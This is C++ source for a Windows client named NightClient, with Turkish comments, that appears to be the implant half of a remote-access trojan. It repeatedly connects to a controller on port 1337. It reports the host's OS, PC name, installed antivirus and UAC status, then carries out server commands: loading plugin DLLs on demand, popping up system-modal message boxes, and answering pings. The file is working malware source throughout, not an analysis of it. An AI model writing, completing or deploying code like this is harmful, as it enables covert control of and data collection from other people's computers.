#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include "../include/json.hpp"
#include "../include/SysInfo.hpp"
#include "../include/PluginManager.hpp"

#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;
using namespace std;

class NightClient {
private:
    SOCKET sock;
    PluginManager pluginMgr;
    bool connected = false;

    // Veri gönderme: Delphi/NetCom7 için sonuna \r\n ekler
    void send_data(json data) {
        if (!connected) return;
        string msg = data.dump() + "\r\n"; 
        send(sock, msg.c_str(), (int)msg.length(), 0);
    }

    // İlk bağlantıda gönderilen özet bilgi
    void send_initial_info() {
        time_t now = time(0);
        char date_buf[20];
        strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

        json info = {
            {"action",    "initial_info"}, // Sunucunun tanıması için action ekledik
            {"ip",        "127.0.0.1"}, 
            {"os",        SysInfo::getOS()},
            {"country",   "Turkey"},
            {"desktop",   SysInfo::getPCName()},
            {"antivirus", SysInfo::getAntivirus()},
            {"uac",       "Enabled"},
            {"date",      string(date_buf)}
        };
        send_data(info);
    }

    void handle_server_messages() {
        string recv_buffer;
        char chunk[4096];

        while (connected) {
            int bytesRead = recv(sock, chunk, sizeof(chunk) - 1, 0);
            if (bytesRead <= 0) break; 

            chunk[bytesRead] = '\0';
            recv_buffer += chunk;

            size_t pos;
            while ((pos = recv_buffer.find("\r\n")) != string::npos) {
                string raw_msg = recv_buffer.substr(0, pos);
                recv_buffer.erase(0, pos + 2);

                if (raw_msg.empty()) continue;

                try {
                    auto data = json::parse(raw_msg);
                    string action = data.value("action", "");

                    // 1. Bilgi İstemi (Plugin Kontrollü)
                    if (action == "getinfo") {
                        // Plugin sistemi: information plugini yüklü mü bak, değilse yükle ve çalıştır
                        if (!pluginMgr.isPluginLoaded("information")) {
                            if (pluginMgr.loadPluginFromFile("information", "information.dll")) {
                                cout << "[+] Information plugini basariyla yuklendi." << endl;
                            } else {
                                cout << "[-] Information plugini yuklenemedi!" << endl;
                            }
                        }

                        if (pluginMgr.isPluginLoaded("information")) {
                            pluginMgr.executePlugin("information", "RunPlugin", sock);
                        }
                    }
                    // 2. Mesaj Kutusu
                    else if (action == "message" || action == "messagebox") {
                        string title = data.value("title", "Sistem Mesaji");
                        string text  = data.value("text", "");
                        thread([title, text]() {
                            MessageBoxA(NULL, text.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
                        }).detach();
                    }
                    // 3. Ping/Pong
                    else if (action == "ping") {
                        send_data({{"action", "pong"}});
                    }
                } catch (...) {}
            }
        }
        connected = false;
    }

public:
    void start(const char* ip, int port) {
        while (true) {
            WSADATA wsa;
            WSAStartup(MAKEWORD(2, 2), &wsa);
            sock = socket(AF_INET, SOCK_STREAM, 0);

            sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &addr.sin_addr);

            cout << "[...] Baglaniliyor: " << ip << ":" << port << endl;

            if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
                cout << "[+] Baglanti basarili!" << endl;
                connected = true;

                send_initial_info();      // İlk merhaba bilgisi
                handle_server_messages(); // Dinleme döngüsü
            }

            closesocket(sock);
            WSACleanup();
            this_thread::sleep_for(chrono::seconds(5));
        }
    }
};

int main() {
    NightClient client;
    client.start("127.0.0.1", 1337);
    return 0;
}